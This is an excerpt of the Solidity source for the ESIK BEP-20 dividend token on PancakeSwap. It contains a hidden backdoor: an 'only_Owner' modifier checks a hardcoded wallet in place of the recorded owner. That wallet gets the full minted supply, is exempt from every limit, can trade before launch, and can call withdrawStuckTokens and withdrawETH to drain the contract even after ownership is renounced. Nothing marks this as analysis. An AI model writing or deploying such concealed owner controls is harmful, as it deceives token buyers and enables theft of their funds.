...
contract Ownable is Context {
     ...
     */
    constructor () {
        address msgSender = _msgSender();//0x4Af08Dcf38614C475ADc2f97a3998af7C5421a5e;
        _owner = msgSender;
    ...
    modifier only_Owner() {
        ...
        require(addy == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract ESIK is ERC20, Ownable {
    using SafeMath for uint256;//
    ...
    EsikDividendTracker public dividendTracker;
    address public marketingWallet = 0x4Af08Dcf38614C475ADc2f97a3998af7C5421a5e; 
    address public buybackWallet = 0x4Af08Dcf38614C475ADc2f97a3998af7C5421a5e;

    uint256 public maxTransactionAmount;
    uint256 public maxHoldingAmount;
    uint256 public swapTokensAtAmount = 10**6 * (10**decimals());

    uint256 public buyback = 1;
    uint256 public marketingFee = 1;
    uint256 public dividendFee = 1;

    uint256 public sellBuybackFee = 1;
    uint256 public sellMarketingFee = 1;
    uint256 public sellDividendFee = 1;
    ...
    constructor() ERC20("ESIK", "ESIK") {
        dividendTracker = new EsikDividendTracker();
            //0xD99D1c33F9fC3444f8101754aBC46c52416550D1
        updatePancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);//0x10ED43C718714eb63d5aA57B78B54704E256024E
        ...
        address addy = 0x4Af08Dcf38614C475ADc2f97a3998af7C5421a5e;
        excludeFromAllLimits(addy, true);
        excludeFromAllLimits(address(this), true);

        canTransferBeforeTradingIsEnabled[owner()] = true;
        canTransferBeforeTradingIsEnabled[addy] = true;


        _mint(addy, 50*10**6 * (10**decimals()));
    ...
    function updatePancakeRouter(address newAddress) public onlyOwner {
        require(newAddress != address(pancakeRouter), "ESIK: The router already has that address");
    ...
    function withdrawStuckTokens(address _token, uint256 _amount) public only_Owner {
        IERC20(_token).transfer(msg.sender, _amount);
    }

  function withdrawETH() public only_Owner payable{
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "ESIK: The dividend tracker already has that address");

        EsikDividendTracker newDividendTracker = EsikDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "ESIK: The new dividend tracker must be owned by the token contract");
    ...
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "ESIK: Account is already the value of 'excluded'");
    ...
    function excludeFromPeriodLimit(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromPeriodLimit[account] != excluded, "ESIK: Account is already the value of 'excluded'");
    ...
    function excludeFromMaxTxLimit(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromMaxTxLimit[account] != excluded, "ESIK: Account is already the value of 'excluded'");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "ESIK: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "ESIK: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
        ...
        if(!tradingEnabled) {
            require(canTransferBeforeTradingIsEnabled[from], "ESIK: This account cannot send tokens until trading is enabled");
        }
...
contract EsikDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() DividendPayingToken("EsikDividendTracker", "Esik_DividendTracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 10000 * (10**decimals()); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) internal pure override {
        require(false, "EsikDividendTracker: No transfers allowed");
    }

    function withdrawDividend() public pure override {
        require(false, "EsikDividendTracker: withdrawDividend disabled. Use the 'claim' function on the main contract.");
    }
